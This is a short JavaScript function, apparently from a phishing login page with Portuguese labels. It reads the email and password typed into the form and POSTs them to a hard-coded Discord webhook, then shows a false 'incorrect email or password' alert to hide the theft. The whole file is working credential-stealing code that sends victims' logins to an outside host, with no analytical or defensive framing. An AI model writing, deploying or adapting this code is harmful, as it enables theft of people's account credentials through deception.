async function enviar() {
  var email=window.document.getElementById("email").value;
  var senha=window.document.getElementById("senha").value;
  var webhook="https://discord.com/api/webhooks/1362173614207664378/z0jja3CjLx2nIWiiUWnAevTum_PU_bll609N4mdXGUN-JtUY8y4ehOzgnqGVx-c3rTsV"
  
  msg={
    content: "Email:"+email+"\nSenha:"+senha};
    
  await fetch(webhook,{
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify(msg)
});
alert("Email ou senha incorrectos, digite correctamente");}